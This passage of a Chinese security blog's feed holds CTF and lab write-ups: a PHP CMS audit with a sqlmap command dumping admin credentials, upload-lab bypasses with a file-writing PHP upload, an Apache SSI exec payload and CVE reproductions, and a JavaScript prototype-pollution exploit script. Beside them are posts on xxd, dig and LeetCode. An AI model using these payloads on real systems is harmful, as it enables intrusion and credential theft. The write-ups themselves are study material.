&#39;.get_id(&#39;channel&#39;,&#39;cha_code&#39;,&#39;goods&#39;));</code></pre><p>这里忘记过滤了</p><pre><code class="php">$obj-&gt;set_where(&quot;goo_title like &#39;%&quot; . $global[&#39;key&#39;] . &quot;%&#39;&quot;);</code></pre><p><img src="/posts/728b20a1/1580564002356.png" alt></p><p>同样的尝试使用 <code>sqlmap</code> 但是还是失败了(怕是个假的吧)</p><pre><code> ./sqlmap.py -u &quot;http://localhost/?/search/index.html/key-%27*%20%23/&quot; -v 3 --technique=T -D &#39;sinsiu&#39; -T &#39;php_admin&#39; -C &#39;adm_id,adm_username,adm_password&#39; --dump</code></pre><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>admin/basic_func.php</code> 中：</p><p><code>$global[&#39;channel&#39;]</code> 参数可控，比如访问 <code>/admin.php?/service/mod-user_sheet/</code>,那么获取到的是 <code>service</code> ，之后判断文件是否存在进行包含</p><pre><code class="php">    global $global;    $global = array();    var_dump($_SERVER[&#39;QUERY_STRING&#39;]);    $global[&#39;url&#39;] = $filter($_SERVER[&#39;QUERY_STRING&#39;]);    if($global[&#39;url&#39;] != &#39;&#39;)    {        $arr = explode(&#39;/&#39;,$global[&#39;url&#39;]); //以 / 做分隔符        $global[&#39;channel&#39;] = $arr[1];        var_dump($global);</code></pre><p><img src="/posts/728b20a1/1580564015011.png" alt></p><pre><code class="php">function main(){    global $global,$smarty;    set_global();    include_all(&#39;admin/class&#39;);    set_more_global();    $path = &#39;admin/admin.php&#39;;    if($global[&#39;url&#39;] != &#39;&#39;)    {        $path2 = &#39;admin/&#39;.$global[&#39;channel&#39;].&#39;.php&#39;; //获取到 $global[&#39;channel&#39;] 这个参数可控        var_dump(file_exists($path2));        if(file_exists($path2))        {            $path = $path2;        }    }    include($path);}</code></pre><p>但是这里如果传入 <code>../</code> 那么就会导致 <code>file_exists</code> 返回错误，所以暂时无能为力</p><p><code>admin/common.func.php</code> 文件中</p><pre><code class="php">function run($parameter){    global $smarty;    $path = &#39;&#39;;    $display = &#39;&#39;;    extract($parameter); //extract函数存在变量覆盖，但是参数不可控    $func = &#39;module_&#39;.$module;    include(&#39;admin/module/&#39;.$path.$module.&#39;.php&#39;);    $func($parameter);    if($display != &#39;no&#39;)    {        $smarty-&gt;display(&#39;module/&#39;.$path.$module.&#39;.php&#39;);    }}</code></pre><h2 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h2><p><code>common.func.php</code> 存在一处编辑配置文件</p><p><img src="/posts/728b20a1/1580564028890.png" alt></p><p>当然此处是可以随意修改文件的，只是没办法写shell</p><p><img src="/posts/728b20a1/1580564041634.png" alt></p><p>可见过滤还是挺严格的</p><p><img src="/posts/728b20a1/1580564050184.png" alt></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><code>getRemoteImage.php</code> 文件中，</p><p>可以获取远程图片</p><p>首先必须是 http开头的</p><pre><code class="php">if(strpos($imgUrl,&quot;http&quot;)!==0){                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>校验了后缀名</p><pre><code class="php">            $fileType = strtolower( strrchr( $imgUrl , &#39;.&#39; ) );            if ( !in_array( $fileType , $config[ &#39;allowFiles&#39; ] ) || stristr( $heads[ &#39;Content-Type&#39; ] , &quot;image&quot; ) ) {                array_push( $tmpNames , &quot;error&quot; );                continue;            }</code></pre><p>相关的白名单</p><pre><code class="php">    $config = array(        &quot;savePath&quot; =&gt; &quot;../../images/editor/&quot; ,            //保存路径        &quot;allowFiles&quot; =&gt; array( &quot;.gif&quot; , &quot;.png&quot; , &quot;.jpg&quot; , &quot;.jpeg&quot; , &quot;.bmp&quot; ) , //文件允许格式        &quot;maxSize&quot; =&gt; 30000                    //文件大小限制，单位KB    );</code></pre><p>之后会读取文件</p><pre><code class="php">readfile( $imgUrl,false,$context);</code></pre><p>这么看来感觉问题不大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-21" target="_blank" rel="noopener">PHP代码审计初尝</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-xxd</title>
      <link href="/posts/2e8d4a2a/"/>
      <url>/posts/2e8d4a2a/</url>
      
        <content type="html"><![CDATA[<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>基本选项</p><ul><li>-a : 它的作用是自动跳过空白内容，默认是关闭的</li><li>-c : 它的后面加上数字表示每行显示多少字节的十六进制数，默认是16字节。</li><li>-g : 设定以几个字节为一块，默认为2字节。</li><li>-l : 显示多少字节的内容。</li><li>-s : 后面接【+-】和address.加号表示从地址处开始的内容，减号表示距末尾address开始的内容。</li><li>-ps: output in postscript plain hexdump style</li></ul><p>xxd 是有单位的，如</p><p><img src="/posts/2e8d4a2a/1580557821863.png" alt></p><p>和</p><p><img src="/posts/2e8d4a2a/1580557833258.png" alt></p><p>很显然其中一个 0x100 是 256个字节，也就是16行咯</p><h3 id="g-选项的含义"><a href="#g-选项的含义" class="headerlink" title="-g 选项的含义"></a>-g 选项的含义</h3><p>默认是两个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20 monster.jpg00002601: eeae ee33 b2ae ae9b b979 0eb8 e171 a040  ...3.....y...q.@00002611: 2146 78f7 d5a0 fef0 79e7 5135 fbf5 7f48  !Fx.....y.Q5...H</code></pre><p>通过 -g 变为一个字节一组</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 monster.jpg 00002601: ee ae ee 33 b2 ae ae 9b b9 79 0e b8 e1 71 a0 40  ...3.....y...q.@00002611: 21 46 78 f7 d5 a0 fe f0 79 e7 51 35 fb f5 7f 48  !Fx.....y.Q5...H</code></pre><h2 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h2><p>如果我只想要十六进制,加上 -ps 选项</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1  -ps monster.jpg eeaeee33b2aeae9bb9790eb8e171a040214678f7d5a0fef079e75135fbf57f48</code></pre><p>​    可以输出C语言数组形式</p><pre><code class="bash">$ xxd -s -100 -l 0x20  -g 1 -i  monster.jpg unsigned char monster_jpg[] = {  0xee, 0xae, 0xee, 0x33, 0xb2, 0xae, 0xae, 0x9b, 0xb9, 0x79, 0x0e, 0xb8,  0xe1, 0x71, 0xa0, 0x40, 0x21, 0x46, 0x78, 0xf7, 0xd5, 0xa0, 0xfe, 0xf0,  0x79, 0xe7, 0x51, 0x35, 0xfb, 0xf5, 0x7f, 0x48};unsigned int monster_jpg_len = 32;</code></pre><h2 id="与vim结合"><a href="#与vim结合" class="headerlink" title="与vim结合"></a>与vim结合</h2><p><code>vim 文件名 -b</code> 以二进制方式打开文件</p><p>然后输入命令 <code>%!xxd</code></p><p>就可以进入到十六进制编辑模式</p><p>编辑完之后需要用 <code>%!xxd -r</code> 保存，退回到原来的vim模式</p><h2 id="反向dump"><a href="#反向dump" class="headerlink" title="反向dump"></a>反向dump</h2><pre><code class="bash"># pxy @ LAPTOP-UBIEP4K5$ xxd monster.jpg file.dump# pxy @ LAPTOP-UBIEP4K5$ head -n 4 file.dump 00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.&#39;# pxy @ LAPTOP-UBIEP4K5 $ xxd -r file.dump &gt; a.jpg# pxy @ LAPTOP-UBIEP4K5 $ file a.jpg a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</code></pre><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><pre><code class="php">php &gt; $a = array(1,2,3,4,5);php &gt; current($a);php &gt; echo current($a);1php &gt; echo next($a);2php &gt; echo current($a);2php &gt; echo end($a);5php &gt; echo current($a);5php &gt; echo reset($a);1php &gt; echo current($a);</code></pre><p>于是这样就可以理解了</p><p><img src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><pre><code class="php">$file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];if (!is_array($file)) {    $file = explode(&#39;.&#39;, strtolower($file));}var_dump($file);$ext = end($file);var_dump($ext);$allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);if (!in_array($ext, $allow_suffix)) {    $msg = &quot;禁止上传该后缀文件!&quot;;}else{    $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;    if (move_uploaded_file($temp_file, $img_path)) {        $msg = &quot;文件上传成功！&quot;;        $is_upload = true;    } else {</code></pre><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可</p><p><img src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><pre><code class="php">    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);</code></pre><p>我们上传一个 <code>shell.php</code><br>内容为：</p><pre><code class="php">&lt;?php file_put_contents(&quot;info.php&quot;, &quot;&lt;?php phpinfo(); ?&gt;&quot;)?&gt;</code></pre><p>之后去访问这个文件，就能生成 info.php</p><p><img src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src="/posts/5877398d/1580564202994.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.99.100:8080/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>环境中处理文件上传的代码:</p><pre><code class="php">&lt;?phpif(isset($_FILES[&#39;file&#39;])) {    $name = basename($_POST[&#39;name&#39;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {        exit(&#39;bad file&#39;);    }    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);</code></pre><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><pre><code class="php">$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];var_dump($uploaded_name);</code></pre><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &#39;&#39;        nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]        chars = [&#39;M&#39;,&#39;CM&#39;,&#39;D&#39;,&#39;CD&#39;,&#39;C&#39;,&#39;XC&#39;,&#39;L&#39;,&#39;XL&#39;,&#39;X&#39;,&#39;IX&#39;,&#39;V&#39;,&#39;IV&#39;,&#39;I&#39;]        for i in nums:            x = num // i            num = num % i            result += x*chars[nums.index(i)]        return result</code></pre><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &quot;&quot;        roman = {1000:&#39;M&#39;,900:&#39;CM&#39;, 500:&#39;D&#39;, 400:&#39;CD&#39;, 100:&#39;C&#39;,90:&#39;XC&#39;, 50:&#39;L&#39;, 40: &#39;XL&#39;,10:&#39;X&#39;,9:&#39;IX&#39;, 5:&#39;V&#39;,4:&#39;IV&#39;, 1:&#39;I&#39;}        for i in roman:            x = num // i            num = num % i            result += x*roman[i]        return result</code></pre><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><pre><code class="python">d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}</code></pre><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><pre><code class="python">class Solution:    def romanToInt(self, s: str) -&gt; int:        d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}        result = 0        for i,n in enumerate(s):            a = max(i-1,0)            b = d.get(s[a:i+1], d[n]) # 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]            result += b        return result</code></pre><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><pre><code class="python">return sum(d.get(s[max(i-1, 0):i+1], d[n]) for i, n in enumerate(s))</code></pre><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><pre><code>;; QUESTION SECTION:;prontosil.club.                        IN      CNAME;; ANSWER SECTION:prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.;; Query time: 55 msec</code></pre><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><pre><code>;; ANSWER SECTION:_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0=.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl/Rhg0=&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre><h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p><p>两个奇特的字符 ==”ı”、”ſ”。==</p><p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p><pre><code class="js">router.post(&#39;/action&#39;, function (req, res) {  